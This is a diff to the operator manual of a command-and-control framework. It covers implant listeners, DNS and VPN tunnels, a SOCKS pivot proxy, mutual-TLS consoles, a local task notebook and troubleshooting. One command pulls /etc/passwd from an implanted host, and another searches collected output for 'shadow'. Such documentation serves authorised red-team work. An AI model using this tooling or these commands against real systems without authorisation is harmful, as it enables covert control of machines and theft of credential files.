@@ -29,21 +29,39 @@ the token env var is not visible to the unit.
 
 | Listener | Default | Exposure |
 |---|---|---|
-| `agent_listen` | `0.0.0.0:4001` | reachable by implants (TCP beacon) |
+| `agent_listen` | `0.0.0.0:4001` | reachable by implants (TCP beacon, pivot callbacks) |
 | `operator_listen` | `127.0.0.1:4002` | **never** public; reach it through SSH or WireGuard |
-| `http_listen` | `127.0.0.1:4003` | behind the tunnel-facing proxy (`deploy/nginx-http-transport.conf`) |
+| `http_listen` | `127.0.0.1:4003` | behind the tunnel-facing proxy (`deploy/nginx-http-transport.conf`); also serves the WebSocket upgrade |
+| `tls_listen` | *(empty)* | mutual TLS: agents and operators that present a client certificate |
+| `dns_listen` | *(empty)* | the DNS tunnel (UDP); only answers for `dns_domain` |
+| `vpn_listen` | *(empty)* | the layer-3 tunnel (UDP) |
+| `socks_listen` | *(empty)* | the persistent SOCKS5 proxy through `socks_agent` |
 
 `server.http_tls_cert` / `http_tls_key` make the Go listener itself serve TLS.
 Leave them empty for beacons: an implant has no TLS stack, so only a TLS-speaking
 relay could use that listener. The supported shape is tunnel → plain listener.
 
-Neither transport has a TLS layer: the beacons speak plain TCP and plain
-HTTP/1.1, so **TLS termination in front of them does not work** — a plaintext
-client cannot complete a TLS handshake. When implants must cross an untrusted
-network, put the transport inside an encrypted tunnel (WireGuard, IPsec, an
-mTLS mesh) and keep the listener bound to the tunnel interface. The frames are
-individually AEAD-sealed, so a tunnel is about hiding *traffic shape* (ports,
-cadence, sizes), not about protecting payload contents.
+The beacons speak plain TCP and plain HTTP/1.1, so **TLS termination in front
+of them does not work** — a plaintext client cannot complete a TLS handshake.
+When implants must cross an untrusted network, put the transport inside an
+encrypted tunnel (WireGuard, IPsec, an mTLS mesh) and keep the listener bound
+to the tunnel interface. The frames are individually AEAD-sealed, so a tunnel
+is about hiding *traffic shape* (ports, cadence, sizes), not about protecting
+payload contents.
+
+The operator console is the exception: it has a TLS stack, so a remote console
+can use the mutual TLS listener:
+
+```bash
+umbra --server c2.example.com:4002 --operator alice --tls \
+      --tls-ca /etc/umbra/ca.pem --tls-server-name c2.example.com \
+      --tls-cert /etc/umbra/console.pem --tls-key /etc/umbra/console.key \
+      --watch
+```
+
+`tls_listen` refuses to start without `tls_cert`, `tls_key` and
+`tls_client_ca`: the listener is mutual TLS, so a client certificate is
+mandatory and a stolen token alone is not enough to take over an operation.
 
 ## 3. Operator workflow
 
@@ -109,7 +127,40 @@ off exponentially up to 5 minutes, so a beacon never hammers a dead server.
   agent PSK and operator tokens** (delete the implants or they will simply
   re-register).
 
-## 5a. Audit trail
+## 5a. The operator's notebook
+
+The team server keeps the authoritative state. The console keeps a second,
+local copy of the part of the history that belongs to the operator: the tasks
+they ran, the results they collected and the notes they left for the team.
+It is a single SQLite file, `~/.umbra/state.db` by default.
+
+```bash
+umbra db stats                     # how much is in the notebook
+umbra db tasks                     # the tasks this console submitted
+umbra db tasks --agent web-01      # only the ones for one implant
+umbra db results <task-id>         # the output of one task
+umbra db search "shadow"           # search arguments, notes and output
+umbra db note "the DC is dc01.corp.example" --agent web-01
+umbra db export engagement.json     # a portable copy of the notebook
+```
+
+The notebook needs no server and no token: `umbra db ...` works offline, which
+is exactly what an operator wants when the server is down or when the
+question is about something that happened yesterday.
+
+Two properties matter:
+
+* **no secrets.** The operator token, the agent PSK and the session keys stay
+  in memory. The notebook holds task metadata and task output — the same
+  material the server already stores — and nothing else.
+* **the operator owns it.** The file is not part of the server state, is not
+  synchronised with the team, and is not touched by anybody else. Deleting it
+  loses nothing the server does not have.
+
+The path is configurable with `--db` or `UMBRA_DB`; an empty value switches
+the notebook off entirely.
+
+## 5b. Audit trail
 
 Every operator command is appended to `audit_file` as one JSON object per line,
 before the reply is sent:
@@ -142,7 +193,7 @@ start-up when it is off, and `umbra audit` says so instead of showing an empty
 list. On a real engagement, treat the audit file as evidence: ship it off the
 server, and do not give operators write access to it.
 
-## 5b. Roles
+## 5c. Roles
 
 Operator identities are configured with a role:
 
@@ -166,7 +217,7 @@ console refuses locally what the server would refuse anyway. A refusal is
 audited (`ok=false`, `err` starting with `permission denied`), so "who tried
 what" includes what they were not allowed to do.
 
-## 5c. Chat and recurring tasks
+## 5d. Chat and recurring tasks
 
 * `umbra chat hello team` / `umbra chat` — the last 200 messages are kept in
   memory and every console receives them as a `chat` event.
@@ -177,7 +228,7 @@ what" includes what they were not allowed to do.
   5–86400 s, and a schedule that came due while the server was down fires once,
   not once per missed interval.
 
-## 5d. Working as a team
+## 5e. Working as a team
 
 The server is shared state: everything one console does is visible to the
 others, and three small mechanisms keep a team from stepping on each other.
@@ -198,7 +249,7 @@ others, and three small mechanisms keep a team from stepping on each other.
   own. The history stays shared and shows the recipient, because a shared
   engagement needs a shared record: treat it as addressing, not encryption.
 
-## 5e. File transfer
+## 5f. File transfer
 
 ```bash
 umbra --server 127.0.0.1:4002 --operator alice download web-01 /etc/passwd ./passwd
@@ -262,6 +313,11 @@ NTP, or raise the limit if you accept the risk.
 - [ ] `data_file` on a filesystem with enough room for task history
 - [ ] outbound allow-list on the implant host (only the C2 address/port)
 - [ ] logs shipped somewhere the operators cannot silently edit
+- [ ] mutual TLS for a remote console (`tls_listen`, `tls_client_ca`), the token alone is not enough
+- [ ] `http_pad` set, so the length of a request does not tell what it carried
+- [ ] armory signing key offline; the catalogue is signed before it is copied to the server
+- [ ] `socks_listen` and `vpn_listen` bound to an interface only the team can reach
+- [ ] rendered stagers deleted after the engagement (they carry the agent key)
 
 ## 8. Upgrades
 
@@ -287,3 +343,9 @@ NTP, or raise the limit if you accept the risk.
 | `frame too large` | output > 1 MiB or file download > 900 KiB | use `download` chunks / redirect to a file and pull it in pieces |
 | everything works, then stops after a day | keys rotated but a peer missed the `REKEY` frame | should not happen: `REKEY` always precedes `TASK_BATCH` (PROTOCOL.md §6). Look for `session rekeyed` in the beacon log; if it is missing, capture both sides and file a bug |
 | link drops with "nonce mismatch" right as an operator connects or a task completes | two writers sealed and wrote out of order | nothing to fix in the field: a correctly written pair keeps `seal+write` in one critical section (SEND-SERIAL). If it recurs, it is a bug in the writer added last |
+| `pivot.open` says the agent never answered | the agent is asleep, or the callback was refused | the agent dials back on its own; check the agent listener is reachable from the agent host and watch the server log for `tunnel callback` |
+| the SOCKS5 proxy refuses a CONNECT | the target is unreachable from the agent, not from the console | test the same target from the agent host; the proxy is only a relay |
+| the DNS tunnel gets no answer | the resolver does not know the tunnel domain, or the agent queries the wrong one | point the agent at the server resolver (`UMBRA_DNS_RESOLVER`) and the domain (`UMBRA_DNS_DOMAIN`), and check the server log for `dns tunnel listening` |
+| the WebSocket beacon refuses to connect | the route is wrong, or a proxy in front does not forward the upgrade | the upgrade happens on the beacon route (`/api/v1/beacon`); the proxy needs `proxy_set_header Upgrade $http_upgrade` |
+| the console says `TLS handshake with ... failed` | the CA does not match, or the name in the certificate does not match `--tls-server-name` | pass the right `--tls-ca`, and use the name the certificate carries |
+| the console is refused by the mutual TLS listener | no client certificate was presented | add `--tls-cert` and `--tls-key`; the listener always requires one |
